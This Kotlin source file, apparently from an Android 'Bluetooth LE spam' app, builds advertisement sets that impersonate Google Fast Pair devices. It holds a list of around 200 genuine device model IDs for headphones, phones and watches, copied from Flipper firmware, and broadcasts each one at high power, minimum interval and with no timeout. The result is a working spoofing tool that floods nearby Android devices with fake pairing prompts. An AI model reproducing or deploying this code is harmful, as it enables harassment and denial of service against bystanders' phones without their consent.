package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.os.ParcelUuid
import de.simon.dankelmann.bluetoothlespam.Callbacks.GoogleFastPairAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ServiceDataModel
import java.util.UUID

class GoogleFastPairAdvertisementSetGenerator:IAdvertisementSetGenerator{

    // Genuine Device Id's taken from here:
    // https://github.com/Flipper-XFW/Xtreme-Firmware/commit/46fd5d2eae46cbbf511d8901b6bcfda094ec1573

    val _genuineDeviceIds = mapOf(
        "0001F0" to "Bisto CSR8670 Dev Board",
        "000047" to "Arduino 101",
        "470000" to "Arduino 101 2",
        "00000A" to "Anti-Spoof Test",
        "0A0000" to "Anti-Spoof Test 2",
        "00000B" to "Google Gphones",
        "0B0000" to "Google Gphones 2",
        "0C0000" to "Google Gphones 3",
        "00000D" to "Test 00000D",
        "000007" to "Android Auto",
        "070000" to "Android Auto 2",
        "000008" to "Foocorp Foophones",
        "080000" to "Foocorp Foophones 2",
        "000009" to "Test Android TV",
        "090000" to "Test Android TV 2",
        "000035" to "Test 000035",
        "350000" to "Test 000035 2",
        "000048" to "Fast Pair Headphones",
        "480000" to "Fast Pair Headphones 2",
        "000049" to "Fast Pair Headphones 3",
        "490000" to "Fast Pair Headphones 4",
        "001000" to "LG HBS1110",
        "00B727" to "Smart Controller 1",
        "01E5CE" to "BLE-Phone",
        "0200F0" to "Goodyear",
        "00F7D4" to "Smart Setup",
        "F00002" to "Goodyear",
        "F00400" to "T10",
        "1E89A7" to "ATS2833_EVB",
        "00000C" to "Google Gphones Transfer",
        "0577B1" to "Galaxy S23 Ultra",
        "05A9BC" to "Galaxy S20+",
        "CD8256" to "Bose NC 700",
        "0000F0" to "Bose QuietComfort 35 II",
        "F00000" to "Bose QuietComfort 35 II 2",
        "821F66" to "JBL Flip 6",
        "F52494" to "JBL Buds Pro",
        "718FA4" to "JBL Live 300TWS",
        "0002F0" to "JBL Everest 110GA",
        "92BBBD" to "Pixel Buds",
        "000006" to "Google Pixel buds",
        "060000" to "Google Pixel buds 2",
        "D446A7" to "Sony XM5",
        "2D7A23" to "Sony WF-1000XM4",
        "0E30C3" to "Razer Hammerhead TWS",
        "72EF8D" to "Razer Hammerhead TWS X",
        "72FB00" to "Soundcore Spirit Pro GVA",
        "0003F0" to "LG HBS-835S",
        "002000" to "AIAIAI TMA-2 (H60)",
        "003000" to "Libratone Q Adapt On-Ear",
        "003001" to "Libratone Q Adapt On-Ear 2",
        "00A168" to "boAt  Airdopes 621",
        "00AA48" to "Jabra Elite 2",
        "00AA91" to "Beoplay E8 2.0",
        "00C95C" to "Sony WF-1000X",
        "01EEB4" to "WH-1000XM4",
        "02AA91" to "B&O Earset",
        "01C95C" to "Sony WF-1000X",
        "02D815" to "ATH-CK1TW",
        "035764" to "PLT V8200 Series",
        "038CC7" to "JBL TUNE760NC",
        "02DD4F" to "JBL TUNE770NC",
        "02E2A9" to "TCL MOVEAUDIO S200",
        "035754" to "Plantronics PLT_K2",
        "02C95C" to "Sony WH-1000XM2",
        "038B91" to "DENON AH-C830NCW",
        "02F637" to "JBL LIVE FLEX",
        "02D886" to "JBL REFLECT MINI NC",
        "F00000" to "Bose QuietComfort 35 II",
        "F00001" to "Bose QuietComfort 35 II",
        "F00201" to "JBL Everest 110GA",
        "F00204" to "JBL Everest 310GA",
        "F00209" to "JBL LIVE400BT",
        "F00205" to "JBL Everest 310GA",
        "F00200" to "JBL Everest 110GA",
        "F00208" to "JBL Everest 710GA",
        "F00207" to "JBL Everest 710GA",
        "F00206" to "JBL Everest 310GA",
        "F0020A" to "JBL LIVE400BT",
        "F0020B" to "JBL LIVE400BT",
        "F0020C" to "JBL LIVE400BT",
        "F00203" to "JBL Everest 310GA",
        "F00202" to "JBL Everest 110GA",
        "F00213" to "JBL LIVE650BTNC",
        "F0020F" to "JBL LIVE500BT",
        "F0020E" to "JBL LIVE500BT",
        "F00214" to "JBL LIVE650BTNC",
        "F00212" to "JBL LIVE500BT",
        "F0020D" to "JBL LIVE400BT",
        "F00211" to "JBL LIVE500BT",
        "F00215" to "JBL LIVE650BTNC",
        "F00210" to "JBL LIVE500BT",
        "F00305" to "LG HBS-1500",
        "F00304" to "LG HBS-1010",
        "F00308" to "LG HBS-1125",
        "F00303" to "LG HBS-930",
        "F00306" to "LG HBS-1700",
        "F00300" to "LG HBS-835S",
        "F00309" to "LG HBS-2000",
        "F00302" to "LG HBS-830",
        "F00307" to "LG HBS-1120",
        "F00301" to "LG HBS-835",
        "F00E97" to "JBL VIBE BEAM",
        "04ACFC" to "JBL WAVE BEAM",
        "04AA91" to "Beoplay H4",
        "04AFB8" to "JBL TUNE 720BT",
        "05A963" to "WONDERBOOM 3",
        "05AA91" to "B&O Beoplay E6",
        "05C452" to "JBL LIVE220BT",
        "05C95C" to "Sony WI-1000X",
        "0602F0" to "JBL Everest 310GA",
        "0603F0" to "LG HBS-1700",
        "1E8B18" to "SRS-XB43",
        "1E955B" to "WI-1000XM2",
        "1EC95C" to "Sony WF-SP700N",
        "1ED9F9" to "JBL WAVE FLEX",
        "1EE890" to "ATH-CKS30TW WH",
        "1EEDF5" to "Teufel REAL BLUE TWS 3",
        "1F1101" to "TAG Heuer Calibre E4 45mm",
        "1F181A" to "LinkBuds S",
        "1F2E13" to "Jabra Elite 2",
        "1F4589" to "Jabra Elite 2",
        "1F4627" to "SRS-XG300",
        "1F5865" to "boAt Airdopes 441",
        "1FBB50" to "WF-C700N",
        "1FC95C" to "Sony WF-SP700N",
        "1FE765" to "TONE-TF7Q",
        "1FF8FA" to "JBL REFLECT MINI NC",
        "201C7C" to "SUMMIT",
        "202B3D" to "Amazfit PowerBuds",
        "20330C" to "SRS-XB33",
        "003B41" to "M&D MW65",
        "003D8A" to "Cleer FLOW II",
        "005BC3" to "Panasonic RP-HD610N",
        "008F7D" to "soundcore Glow Mini",
        "00FA72" to "Pioneer SE-MS9BN",
        "0100F0" to "Bose QuietComfort 35 II",
        "011242" to "Nirvana Ion",
        "013D8A" to "Cleer EDGE Voice",
        "01AA91" to "Beoplay H9 3rd Generation",
        "038F16" to "Beats Studio Buds",
        "039F8F" to "Michael Kors Darci 5e",
        "03AA91" to "B&O Beoplay H8i",
        "03B716" to "YY2963",
        "03C95C" to "Sony WH-1000XM2",
        "03C99C" to "MOTO BUDS 135",
        "03F5D4" to "Writing Account Key",
        "045754" to "Plantronics PLT_K2",
        "045764" to "PLT V8200 Series",
        "04C95C" to "Sony WI-1000X",
        "050F0C" to "Major III Voice",
        "052CC7" to "MINOR III",
        "057802" to "TicWatch Pro 5",
        "0582FD" to "Pixel Buds",
        "058D08" to "WH-1000XM4",
        "06AE20" to "Galaxy S21 5G",
        "06C197" to "OPPO Enco Air3 Pro",
        "06C95C" to "Sony WH-1000XM2",
        "06D8FC" to "soundcore Liberty 4 NC",
        "0744B6" to "Technics EAH-AZ60M2",
        "07A41C" to "WF-C700N",
        "07C95C" to "Sony WH-1000XM2",
        "07F426" to "Nest Hub Max",
        "0102F0" to "JBL Everest 110GA - Gun Metal",
        "0202F0" to "JBL Everest 110GA - Silver",
        "0302F0" to "JBL Everest 310GA - Brown",
        "0402F0" to "JBL Everest 310GA - Gun Metal",
        "0502F0" to "JBL Everest 310GA - Silver",
        "0702F0" to "JBL Everest 710GA - Gun Metal",
        "0802F0" to "JBL Everest 710GA - Silver",
        "054B2D" to "JBL TUNE125TWS",
        "0660D7" to "JBL LIVE770NC",
        "0103F0" to "LG HBS-835",
        "0203F0" to "LG HBS-830",
        "0303F0" to "LG HBS-930",
        "0403F0" to "LG HBS-1010",
        "0503F0" to "LG HBS-1500",
        "0703F0" to "LG HBS-1120",
        "0803F0" to "LG HBS-1125",
        "0903F0" to "LG HBS-2000"
        )

    val serviceUuid = ParcelUuid(UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"))

    override fun getAdvertisementSets():List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _genuineDeviceIds.map {

            var advertisementSet:AdvertisementSet = AdvertisementSet()

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = AdvertiseSettings.ADVERTISE_TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = true
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = AdvertisingSetParameters.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = BluetoothDevice.PHY_LE_CODED
            advertisementSet.advertisingSetParameters.secondaryPhy = BluetoothDevice.PHY_LE_2M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val serviceDataModel = ServiceDataModel()
            serviceDataModel.serviceUuid = serviceUuid
            serviceDataModel.serviceData = StringHelpers.decodeHex(it.key)
            advertisementSet.advertiseData.services.add(serviceDataModel)
            advertisementSet.advertiseData.includeTxPower = true

            // Scan Response
            advertisementSet.scanResponse.includeTxPower = true

            // General Data
            advertisementSet.deviceName = it.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GoogleFastPairAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}